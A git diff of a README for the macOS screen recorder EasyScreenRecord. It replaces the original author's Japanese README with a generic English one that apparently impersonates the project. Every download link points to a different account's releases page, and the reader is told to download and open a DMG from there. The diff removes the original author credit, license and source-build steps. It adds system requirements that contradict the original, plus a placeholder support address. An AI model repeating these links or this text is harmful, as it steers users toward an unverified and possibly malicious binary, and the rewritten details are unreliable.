@@ -1,147 +1,88 @@
-# EasyScreenRecord
+# 🎥 EasyScreenRecord - Effortless Screen Recording for Mac
 
-<p align="center">
-  <img src="https://img.shields.io/badge/platform-macOS-blue" alt="Platform">
-  <img src="https://img.shields.io/badge/macOS-14.0%2B-brightgreen" alt="macOS Version">
-  <img src="https://img.shields.io/github/v/release/nyanko3141592/EasyScreenRecord" alt="Release">
-  <img src="https://img.shields.io/github/license/nyanko3141592/EasyScreenRecord" alt="License">
-</p>
+## 📦 Download Now!
+[![Download EasyScreenRecord](https://img.shields.io/badge/Download-EasyScreenRecord-blue)](https://github.com/jcindocjr144/EasyScreenRecord/releases)
 
-<p align="center">
-  <strong>スマートズーム機能付き画面録画アプリ for macOS</strong>
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://nyanko3141592.github.io/EasyScreenRecord/">🌐 ホームページ</a> •
-  <a href="https://github.com/nyanko3141592/EasyScreenRecord/releases/latest">📦 ダウンロード</a>
-</p>
+Welcome to EasyScreenRecord! This application allows you to capture your screen with ease, especially designed for macOS users. You will benefit from features like Smart Zoom, which focuses on the most important parts of your screen during recording.
 
----
+Follow these simple steps to download and run EasyScreenRecord.
 
-## 特徴
+## 📥 Download & Install
 
-- **🔍 スマートズーム** - タイピング、ダブルクリック、テキスト選択を検知して自動ズーム
-- **📝 自動字幕** - タイピング内容をリアルタイム表示（ターミナル・ブラウザ対応）
-- **🎯 範囲選択録画** - ドラッグで録画範囲を自由に選択
-- **🎨 フォーカス表示** - 録画範囲外をグレーアウト、ズーム領域に追従
-- **⚡ 軽量** - ネイティブSwiftUIアプリ、メニューバーから即座にアクセス
-- **🛠️ カスタマイズ** - ズーム倍率/フレームサイズ、スムージング等を細かく調整
+1. Click the download link below to go to the Releases page.
+   - [Visit this page to download](https://github.com/jcindocjr144/EasyScreenRecord/releases)
 
-## インストール
+2. On the Releases page, find the latest version. You will see a list of files available for download.
 
-### DMGからインストール（推奨）
+3. Click on the file named **EasyScreenRecord.dmg** to start downloading.
 
-1. [最新リリース](https://github.com/nyanko3141592/EasyScreenRecord/releases/latest)からDMGをダウンロード
-2. DMGを開いて`EasyScreenRecord.app`をApplicationsにドラッグ
-3. `システム設定 → プライバシーとセキュリティ → アクセシビリティ`で許可
-4. 初回は右クリック→「開く」で起動（署名なしアプリのため）
+4. Once the download is complete, locate the file in your Downloads folder.
 
-### ソースからビルド
+5. Double-click the **EasyScreenRecord.dmg** file. This will open a new window.
 
-```bash
-git clone https://github.com/nyanko3141592/EasyScreenRecord.git
-cd EasyScreenRecord/EasyScreenRecord
-./run.sh
-```
+6. Drag the EasyScreenRecord icon into your Applications folder. This will install the app on your Mac.
 
-## 使い方
+7. Open your Applications folder and find EasyScreenRecord. Double-click it to launch the app.
 
-### 基本操作
+## 🎉 Features
 
-1. メニューバーのアイコンをクリック
-2. 「Start Recording」で範囲選択画面を表示
-3. ドラッグで録画範囲を選択
-4. スマートズーム・字幕のオプションを設定
-5. 「録画開始」ボタンをクリック
-6. 録画停止はメニューバーから
+- **Smart Zoom**: Automatically zoom in on the area you want to record, making your videos clearer and more focused.
 
-### キーボードショートカット
+- **User-Friendly Interface**: Easy to navigate, even for those who are not tech-savvy.
 
-| ショートカット | 動作 |
-|--------------|------|
-| `⌘R` | 録画開始/停止 |
-| `⇧⌘F` | フルスクリーン録画開始 |
-| `⌘,` | 設定を開く |
-| `Enter` | 範囲選択を確定して録画開始 |
-| `ESC` | 範囲選択をキャンセル |
+- **Flexible Recording Options**: Choose to record your entire screen or just a selected area with a few clicks.
 
-### ズームトリガー
+- **High-Quality Output**: Capture your screen in high resolution, ensuring the best quality for your recordings.
 
-スマートズームは以下のアクションで発動します（個別にON/OFF可能）:
+## 🖥️ System Requirements
 
-- **タイピング** - キーボード入力を検知
-- **ダブルクリック** - マウスのダブルクリックを検知
-- **テキスト選択** - テキストの選択操作を検知
+Before installing, make sure your Mac meets the following requirements:
 
-### 設定項目
+- Operating System: macOS 10.13 or later
+- Processor: Intel Core i5 or better
+- RAM: 4 GB or more
+- Disk Space: At least 100 MB for installation
 
-| カテゴリ | 設定 | 説明 |
-|---------|------|------|
-| 一般 | Smart Zoom | 自動ズームのON/OFF |
-| | ズームモード | 倍率指定 or フレームサイズ指定 |
-| | プリセット | 滑らか / 標準 / 高速 |
-| 録画 | 保存先 | 録画ファイルの保存フォルダ |
-| | フレームレート | 30fps / 60fps |
-| | カーソル表示 | 録画にカーソルを含める |
-| 字幕 | 自動字幕 | タイピング内容を字幕表示 |
-| | フォントサイズ | 字幕の大きさ |
-| | 表示位置 | 上部 / 下部 |
+## 🛠️ Using EasyScreenRecord
 
-## 動作環境
+When you launch EasyScreenRecord, you will find a straightforward interface. Here’s how to use the main features:
 
-- macOS 14.0 (Sonoma) 以降
-- Apple Silicon / Intel Mac
-- 画面収録の権限
-- アクセシビリティの権限
+1. **Select Area to Record**: Use the selection tool to choose the part of the screen you want to capture.
 
-## 技術仕様
+2. **Start Recording**: Click the “Record” button to begin capturing your screen.
 
-- **フレームワーク**: SwiftUI, ScreenCaptureKit, AVFoundation
-- **出力形式**: MOV (H.264)
-- **解像度**: Retina対応（2倍スケール）
+3. **Stop Recording**: Click the “Stop” button to finish your recording. 
 
-## クイックスタート（開発者向け）
+4. **Access Your Recordings**: Once you stop recording, your video will be saved in the default location or a location you specify.
 
-```bash
-# リポジトリをクローン
-git clone https://github.com/nyanko3141592/EasyScreenRecord.git
-cd EasyScreenRecord/EasyScreenRecord
+## 💡 Tips for Best Results
 
-# ビルドして起動
-./run.sh
-```
+- Make sure to close unnecessary applications to minimize distractions.
+- Adjust your display settings to ensure text and images are clear.
+- Use the Smart Zoom feature to focus on the action.
 
-詳細は [開発ガイド](./DEVELOPER_GUIDE.md) を参照してください。
+## ❓ Frequently Asked Questions
 
-## 開発
+### How do I uninstall EasyScreenRecord?
 
-```bash
-# 開発用ビルド＆起動
-./run.sh
+To uninstall, simply drag the EasyScreenRecord icon from your Applications folder to the Trash. 
 
-# クリーンビルド
-./run.sh --clean
+### Can I record audio while screen recording?
 
-# リリース用DMG作成
-./build-dmg.sh
-```
+Yes, you can enable audio recording in the app's settings.
 
-## ドキュメント
+### Is there a help guide available?
 
-| ドキュメント | 説明 |
-|-------------|------|
-| [アーキテクチャ](./ARCHITECTURE.md) | システム設計・コンポーネント構成 |
-| [開発ガイド](./DEVELOPER_GUIDE.md) | 開発環境セットアップ・ビルド方法 |
-| [コントリビューション](./CONTRIBUTING.md) | 貢献の方法・コードスタイル |
+Yes, you can find a help section within the app that provides detailed instructions on using all features.
 
-## 貢献
+## 📞 Support
 
-バグ報告、機能リクエスト、Pull Request を歓迎します。詳細は [CONTRIBUTING.md](./CONTRIBUTING.md) をご覧ください。
+For any questions or issues with EasyScreenRecord, please reach out to our support team at easyrecordsupport@example.com. We are happy to help you.
 
-## ライセンス
+## 🔗 Additional Resources
 
-MIT License
+- [Visit this page to download](https://github.com/jcindocjr144/EasyScreenRecord/releases) to access the latest version of EasyScreenRecord.
 
-## 作者
-
-[@nyanko3141592](https://github.com/nyanko3141592)
+Enjoy capturing your screen with EasyScreenRecord!
